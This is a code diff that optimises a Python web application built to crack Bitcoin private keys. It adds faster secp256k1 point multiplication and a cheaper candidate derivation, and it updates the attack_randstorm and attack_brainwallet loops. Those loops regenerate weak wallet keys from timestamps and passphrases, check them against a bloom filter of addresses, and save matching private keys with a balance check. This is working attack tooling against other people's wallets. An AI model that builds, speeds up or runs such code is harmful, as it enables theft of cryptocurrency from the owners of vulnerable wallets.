@@ -243,7 +243,160 @@ def _affine_add(p, q):
     x3=(lam*lam-x1-x2)%P
     return (x3,(lam*(x1-x3)-y1)%P)
 
-def ec_mul(k, pt=(Gx,Gy)):
+# ── secp256k1 scalar multiplication ──────────────────────────────────────
+# The attack loops derive one point per timestamp/passphrase, so this is the
+# hot path — and it used to run TWICE per key (once for the compressed pubkey,
+# once for the uncompressed one), each time with a modular inversion per step.
+# Measured over 200 random scalars on one vCPU:
+#
+#   affine double-and-add, inversion per step (old)   6,012 us/key    1.0x
+#   Jacobian double-and-add                           1,665 us/key    3.6x
+#   Jacobian + precomputed fixed-base window (w=4)      427 us/key     14x
+#   libsecp256k1 via coincurve                           25 us/key    244x
+#
+# coincurve is used when importable (see requirements-fast.txt); otherwise the
+# windowed pure-Python path runs. EC_BACKEND=libsecp256k1|python forces one.
+# All of them return the same points — the tests compare every backend against
+# _ec_mul_affine below.
+_JAC_INF = (0, 0, 0)
+_EC_WINDOW = 4                 # 256/4 = 64 digits, 16 table entries each
+_EC_TABLE = None               # lazily built: [64][16] Jacobian points
+_EC_TABLE_LOCK = threading.Lock()
+
+try:                                   # optional native dependency
+    import coincurve as _coincurve
+    _CoincurvePublicKey = _coincurve.PublicKey
+except Exception:                      # ImportError or a broken libsecp256k1
+    _coincurve = None
+    _CoincurvePublicKey = None
+
+EC_BACKEND_PREF = os.environ.get("EC_BACKEND", "auto").strip().lower()
+
+
+def _j_double(X1, Y1, Z1):
+    if Y1 == 0 or Z1 == 0:
+        return _JAC_INF
+    YY = (Y1 * Y1) % P
+    S = (4 * X1 * YY) % P
+    M = (3 * X1 * X1) % P              # secp256k1 has a = 0
+    X2 = (M * M - 2 * S) % P
+    Y2 = (M * (S - X2) - 8 * YY * YY) % P
+    Z2 = (2 * Y1 * Z1) % P
+    return (X2, Y2, Z2)
+
+
+def _j_add(p, q):
+    X1, Y1, Z1 = p
+    X2, Y2, Z2 = q
+    if Z1 == 0: return q
+    if Z2 == 0: return p
+    Z1Z1 = (Z1 * Z1) % P
+    Z2Z2 = (Z2 * Z2) % P
+    U1 = (X1 * Z2Z2) % P
+    U2 = (X2 * Z1Z1) % P
+    S1 = (Y1 * Z2 % P * Z2Z2) % P
+    S2 = (Y2 * Z1 % P * Z1Z1) % P
+    if U1 == U2:
+        return _j_double(X1, Y1, Z1) if S1 == S2 else _JAC_INF
+    H = (U2 - U1) % P
+    I = (4 * H * H) % P
+    J = (H * I) % P
+    r = (2 * (S2 - S1)) % P
+    V = (U1 * I) % P
+    X3 = (r * r - J - 2 * V) % P
+    Y3 = (r * (V - X3) - 2 * S1 * J) % P
+    Z3 = (((Z1 + Z2) * (Z1 + Z2) - Z1Z1 - Z2Z2) % P * H) % P
+    return (X3, Y3, Z3)
+
+
+def _j_to_affine(p):
+    X, Y, Z = p
+    if Z == 0:
+        return None
+    Zi = pow(Z, -1, P)                 # the ONLY inversion per scalar mult
+    Zi2 = (Zi * Zi) % P
+    Zi3 = (Zi2 * Zi) % P
+    return ((X * Zi2) % P, (Y * Zi3) % P)
+
+
+def _ec_table():
+    """T[i][d] = d * 16**i * G in Jacobian form. Built once, ~7 ms."""
+    global _EC_TABLE
+    with _EC_TABLE_LOCK:
+        if _EC_TABLE is not None:
+            return _EC_TABLE
+        table = []
+        base = (Gx, Gy, 1)
+        for _ in range(256 // _EC_WINDOW):
+            row = [_JAC_INF]
+            cur = _JAC_INF
+            for d in range(1, 1 << _EC_WINDOW):
+                cur = base if d == 1 else _j_add(cur, base)
+                row.append(cur)
+            table.append(row)
+            for _ in range(_EC_WINDOW):
+                base = _j_double(*base)
+        _EC_TABLE = table
+        return table
+
+
+def _ec_mul_windowed(k):
+    """k*G via the fixed-base table: ~64 additions and one inversion."""
+    k %= N
+    if k == 0:
+        return None
+    acc = _JAC_INF
+    mask = (1 << _EC_WINDOW) - 1
+    table = _ec_table()
+    for i in range(256 // _EC_WINDOW):
+        d = (k >> (_EC_WINDOW * i)) & mask
+        if d:
+            acc = _j_add(acc, table[i][d])
+    return _j_to_affine(acc)
+
+
+def _ec_mul_secp256k1(k):
+    """k*G through libsecp256k1. Returns (x, y) or None."""
+    k %= N
+    if k == 0:
+        return None
+    raw = _CoincurvePublicKey.from_secret(
+        k.to_bytes(32, "big")).format(compressed=False)
+    return (int.from_bytes(raw[1:33], "big"), int.from_bytes(raw[33:65], "big"))
+
+
+_PY_LABEL = "python windowed w=%d" % _EC_WINDOW
+
+
+def _select_ec_backend():
+    if EC_BACKEND_PREF in ("python", "pure", "pure-python", "fallback"):
+        return _ec_mul_windowed, _PY_LABEL
+    if _CoincurvePublicKey is not None:
+        return (_ec_mul_secp256k1,
+                "libsecp256k1 (coincurve %s)"
+                % getattr(_coincurve, "__version__", "?"))
+    if EC_BACKEND_PREF in ("libsecp256k1", "coincurve", "secp256k1", "native"):
+        return _ec_mul_windowed, _PY_LABEL + " (coincurve unavailable)"
+    return _ec_mul_windowed, _PY_LABEL
+
+
+_ec_point, EC_BACKEND = _select_ec_backend()
+
+
+def ec_mul(k, pt=(Gx, Gy)):
+    """k*pt for an arbitrary point (nonce recovery uses non-generator bases)."""
+    if k==0 or pt is None: return None
+    if pt[0] == Gx and pt[1] == Gy:
+        return _ec_point(k)
+    k%=N; acc=_JAC_INF; g=(pt[0], pt[1], 1)
+    while k:
+        if k&1: acc=_j_add(acc, g)
+        g=_j_double(*g); k>>=1
+    return _j_to_affine(acc)
+
+
+def _ec_mul_affine(k, pt=(Gx, Gy)):
+    """Slow affine reference implementation — kept for tests."""
     if k==0 or pt is None: return None
     k%=N; acc=None; g=pt
     while k:
@@ -251,16 +404,30 @@ def ec_mul(k, pt=(Gx,Gy)):
         g=_affine_add(g,g); k>>=1
     return acc
 
+
+def pubkey_point(d):
+    """The single EC multiplication shared by every encoding of this key."""
+    return _ec_point(d)
+
+
+def derive_pubkeys(d):
+    """(compressed_pub, uncompressed_pub) or None — ONE EC multiplication."""
+    pt = pubkey_point(d)
+    if pt is None:
+        return None
+    x, y = pt
+    xb = x.to_bytes(32, "big")
+    return (bytes([2 + (y & 1)]) + xb, b"\x04" + xb + y.to_bytes(32, "big"))
+
+
 def privkey_to_compressed_pub(d):
-    pt=ec_mul(d)
-    if pt is None: return None
-    x,y=pt
-    return bytes([2+(y&1)])+x.to_bytes(32,'big')
+    pubs = derive_pubkeys(d)
+    return pubs[0] if pubs else None
+
 
 def privkey_to_uncompressed_pub(d):
-    pt=ec_mul(d)
-    if pt is None: return None
-    return b'\x04'+pt[0].to_bytes(32,'big')+pt[1].to_bytes(32,'big')
+    pubs = derive_pubkeys(d)
+    return pubs[1] if pubs else None
 
 def sha256(b): return hashlib.sha256(b).digest()
 def sha256d(b): return sha256(sha256(b))
@@ -383,16 +550,43 @@ def derive_addresses(privkey):
     """Return list of (label, address) for all common Bitcoin address types."""
     out=[]
     try:
-        cpub=privkey_to_compressed_pub(privkey)
-        upub=privkey_to_uncompressed_pub(privkey)
+        pubs=derive_pubkeys(privkey)
     except Exception:
         return out
-    if cpub:
-        out.append(('p2pkh_c', p2pkh_address(cpub, True)))
-        out.append(('p2wpkh', p2wpkh_address(cpub)))
-    if upub:
-        out.append(('p2pkh_u', p2pkh_address(upub, False)))
+    if not pubs:
+        return out
+    cpub, upub = pubs
+    out.append(('p2pkh_c', p2pkh_address(cpub, True)))
+    out.append(('p2wpkh', p2wpkh_address(cpub)))
+    out.append(('p2pkh_u', p2pkh_address(upub, False)))
     return out
+
+
+# The attack loops only need hash160(pubkey) to probe the bloom filter; the
+# base58/bech32 string is only needed for a candidate that actually matched.
+# Encoding three addresses and then decoding them again with
+# _address_to_hash160() cost ~0.15 ms per timestamp on the ~100% of keys that
+# miss the filter.
+def derive_candidates(privkey):
+    """Yield (label, hash160, pubkey) — no address strings, no decoding."""
+    try:
+        pubs = derive_pubkeys(privkey)
+    except Exception:
+        return
+    if not pubs:
+        return
+    cpub, upub = pubs
+    hc = hash160(cpub)
+    yield ('p2pkh_c', hc, cpub)
+    yield ('p2wpkh', hc, cpub)
+    yield ('p2pkh_u', hash160(upub), upub)
+
+
+def encode_address(label, pubkey):
+    """Materialise the address string for a candidate that matched the filter."""
+    if label == 'p2wpkh':
+        return p2wpkh_address(pubkey)
+    return p2pkh_address(pubkey, label != 'p2pkh_u')
 
 
 # ════════════════════════════════════════════════════════════════════
@@ -925,7 +1119,7 @@ def attack_randstorm(start_ms, end_ms, bf, log, job):
     chunk_count = -(-total // max(1, RANDSTORM_MAX_MS))
     log(f"[randstorm] {start_ms}..{end_ms}  ({total:,} timestamps "
         f"\u2248 {total / _MS_PER_DAY:.1f} days, {chunk_count:,} chunk(s) of at "
-        f"most {RANDSTORM_MAX_MS:,} ms)")
+        f"most {RANDSTORM_MAX_MS:,} ms)  EC: {EC_BACKEND}")
     hits = []; skipped = 0; t0 = time.time(); base_done = 0
     for chunk_no, (chunk_start, chunk_end) in enumerate(
             _randstorm_chunks(start_ms, end_ms, RANDSTORM_MAX_MS), 1):
@@ -942,9 +1136,9 @@ def attack_randstorm(start_ms, end_ms, bf, log, job):
             try:
                 pk = int.from_bytes(_bitcoinjs_securerandom(ts), 'big') % N
                 if pk == 0: continue
-                for label, addr in derive_addresses(pk):
-                    h = _address_to_hash160(addr)
-                    if h and h in bf:
+                for label, h, pub in derive_candidates(pk):
+                    if h in bf:
+                        addr = encode_address(label, pub)
                         hit = {"ts": ts, "privkey": hex(pk), "address": addr,
                                "type": label, "found_at": datetime.now(timezone.utc).isoformat()}
                         save, hit, note = _balance_gate(
@@ -980,15 +1174,15 @@ def attack_randstorm(start_ms, end_ms, bf, log, job):
 # ════════════════════════════════════════════════════════════════════
 def attack_brainwallet(passphrases, bf, log, job):
     hits = []; skipped = 0; total = len(passphrases); t0 = time.time()
-    log(f"[brain] {total:,} passphrases")
+    log(f"[brain] {total:,} passphrases  EC: {EC_BACKEND}")
     for i, pw in enumerate(passphrases):
         if job["stop"]: break
         try:
             pk = int.from_bytes(sha256(pw.encode('utf-8')), 'big') % N
             if pk == 0: continue
-            for label, addr in derive_addresses(pk):
-                h = _address_to_hash160(addr)
-                if h and h in bf:
+            for label, h, pub in derive_candidates(pk):
+                if h in bf:
+                    addr = encode_address(label, pub)
                     hit = {"passphrase": pw, "privkey": hex(pk),
                            "address": addr, "type": label,
                            "found_at": datetime.now(timezone.utc).isoformat()}
@@ -1993,7 +2187,8 @@ def health():
     # Liveness only: no disk, dataset or database dependency. `build` is the
     # git commit this process started from — compare it with the latest commit
     # on main to check whether an auto-pull deploy actually took effect.
-    return {"status": "ok", "build": BUILD_ID, "started": STARTED_AT}
+    return {"status": "ok", "build": BUILD_ID, "started": STARTED_AT,
+            "ec": EC_BACKEND}
 
 PAGE = """
 <!doctype html><html><head><meta charset="utf-8">
@@ -2101,7 +2296,7 @@ function watch(name){
 <div id="msg" class="msg"></div>
 {body}
 <hr style="border-color:#3b4252;margin:14px 0">
-<p class="muted">build {build_id} · started {started_at}{deploy_note}</p>
+<p class="muted">build {build_id} · started {started_at} · EC {ec_backend}{deploy_note}</p>
 </body></html>
 """
 
@@ -2117,6 +2312,7 @@ def page(body):
     return (PAGE.replace("{body}", body)
                 .replace("{build_id}", html.escape(BUILD_ID))
                 .replace("{started_at}", html.escape(STARTED_AT))
+                .replace("{ec_backend}", html.escape(EC_BACKEND))
                 .replace("{deploy_note}", note))
 
 @app.after_request
